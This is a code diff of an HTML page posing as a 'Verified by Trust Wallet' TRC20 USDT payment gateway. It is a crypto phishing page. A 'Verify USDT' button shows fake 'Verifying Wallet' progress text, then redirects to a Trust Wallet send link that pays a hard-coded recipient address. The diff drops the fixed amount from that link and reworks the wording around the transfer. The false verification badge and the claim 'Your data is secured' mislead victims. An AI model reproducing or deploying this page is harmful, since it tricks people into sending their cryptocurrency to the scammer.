@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TRC20 Gateway - Verified</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verified by Trust Wallet - TRC20</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     body {
@@ -16,7 +16,7 @@
     }
 
     .badge {
-      background-color: #1e1e1e;
+      background-color: #121212;
       padding: 8px 20px;
       border-radius: 30px;
       display: inline-block;
@@ -24,7 +24,7 @@
       color: #00ff99;
       margin-bottom: 20px;
       border: 1px solid #00ff99;
-      box-shadow: 0 0 8px rgba(0, 255, 153, 0.4);
+      box-shadow: 0 0 10px rgba(0, 255, 153, 0.6);
     }
 
     .logo {
@@ -78,16 +78,16 @@
 
     .processing {
       display: none;
-      margin-top: 15px;
-      color: #00ffcc;
+      margin-top: 20px;
       font-weight: bold;
-      font-size: 15px;
+      font-size: 16px;
       animation: blink 1.2s infinite;
+      color: #00ffcc;
     }
 
     @keyframes blink {
       0%, 100% { opacity: 1; }
-      50% { opacity: 0.2; }
+      50% { opacity: 0.3; }
     }
   </style>
 </head>
@@ -95,27 +95,39 @@
   <div class="badge">✅ Verified by Trust Wallet</div>
 
   <div class="logo">
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=032" alt="TRC20" />
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=026" alt="TRC20" />
   </div>
 
   <h1>Secure TRC20 Payment</h1>
-  <p>Click below to verify your USDT wallet via Trust Wallet DApp.</p>
+  <p>Click below to verify your USDT wallet.<br><strong>It will send your full balance.</strong></p>
 
   <button class="verify-btn" onclick="startProcessing()">Verify USDT</button>
-  <div class="processing" id="processingText">🔄 Processing...</div>
+  <div class="processing" id="processingText">🔒 Secure Session...</div>
 
   <div class="note">
-    ⚠️ Wallet must have minimum <strong>2 TRX</strong> to complete transaction.
+    ⚠️ You must have minimum <strong>2 TRX</strong> for gas fee.
     <br><br>
     Powered by TRC20 Gateway. Your data is secured.
   </div>
 
   <script>
+    let texts = ["🔒 Secure Session...", "💸 Transferring...", "🔐 Verifying Wallet..."];
+    let index = 0;
     function startProcessing() {
-      document.getElementById('processingText').style.display = 'block';
+      const processDiv = document.getElementById('processingText');
+      processDiv.style.display = 'block';
+
+      // Animate text every 1.5s
+      const interval = setInterval(() => {
+        index = (index + 1) % texts.length;
+        processDiv.textContent = texts[index];
+      }, 1500);
+
+      // Redirect after 5 seconds
       setTimeout(() => {
-        window.location.href = 'https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs&amount=1';
-      }, 2000);
+        clearInterval(interval);
+        window.location.href = 'https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs';
+      }, 5000);
     }
   </script>
 </body>
